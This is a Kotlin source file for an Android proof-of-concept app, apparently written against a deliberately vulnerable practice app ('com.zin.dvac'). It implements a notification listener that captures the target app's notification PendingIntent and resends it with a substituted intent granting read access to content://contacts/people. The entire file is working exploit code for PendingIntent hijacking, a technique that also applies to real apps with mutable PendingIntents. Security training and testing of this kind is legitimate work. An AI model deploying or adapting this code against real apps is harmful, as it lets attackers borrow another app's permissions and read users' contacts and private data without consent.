package com.zin.poc_password

import android.app.PendingIntent
import android.content.ClipData
import android.content.Intent
import android.net.Uri
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class ListenService : NotificationListenerService() {
    override fun onNotificationPosted(statusBarNotification: StatusBarNotification) {
        // Check if the notification is from the desired package
        if (statusBarNotification.packageName != "com.zin.dvac") {
            return  // Ignore notifications from other packages
        }


        // Get the content intent from the notification
        val pendingIntent = statusBarNotification.notification.contentIntent


        // Create an intent to hijack the notification action
        val hijackIntent = Intent()
        hijackIntent.setPackage("com.zin.poc_password")
        hijackIntent.setAction("MY.ACTION")


        // Set clip data with a raw URI to content://contacts/people
        hijackIntent.clipData = ClipData.newRawUri(null, Uri.parse("content://contacts/people"))


        // Set flags to the intent
        hijackIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)


        // Send the hijackIntent using the original PendingIntent
        try {
            // Send the hijackIntent as a replacement for the original PendingIntent
            pendingIntent.send(applicationContext, 0, hijackIntent, null, null)
        } catch (e: PendingIntent.CanceledException) {
            e.printStackTrace()
        }
    }
}